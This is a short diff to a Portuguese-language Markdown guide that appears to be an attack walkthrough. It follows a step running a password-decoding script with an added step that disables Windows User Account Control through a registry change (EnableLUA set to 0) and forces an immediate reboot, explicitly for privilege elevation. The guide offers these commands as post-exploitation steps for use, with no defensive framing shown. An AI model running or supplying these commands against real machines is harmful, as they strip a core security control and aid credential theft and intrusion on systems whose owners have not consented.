@@ -196,3 +196,9 @@ Execute:
 ```bash
 python3 decode_users_pass.py
 ```
+
+### 5. Desabilitar UAC para ter elevação de previlegio:
+```bash
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+shutdown /r /t 0
+```
